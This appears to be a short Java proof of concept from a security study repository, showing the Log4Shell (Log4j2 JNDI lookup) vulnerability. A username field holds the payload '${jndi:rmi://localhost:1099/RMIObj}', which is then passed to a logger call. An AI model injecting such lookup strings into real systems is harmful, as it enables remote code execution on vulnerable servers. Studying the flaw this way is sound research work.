package Serialization.Log4j2;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.function.LongFunction;
/**
 * @author L3ttuc3
 * @version 1.0
 * @date 2023/5/6 19:28
 */

public class RealEnv {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);

        String username = "${jndi:rmi://localhost:1099/RMIObj}";
        if (username != null) {
            logger.info("User {} login in!", username);
        }
        else {
            logger.error("User {} not exists", username);
        }
    }
}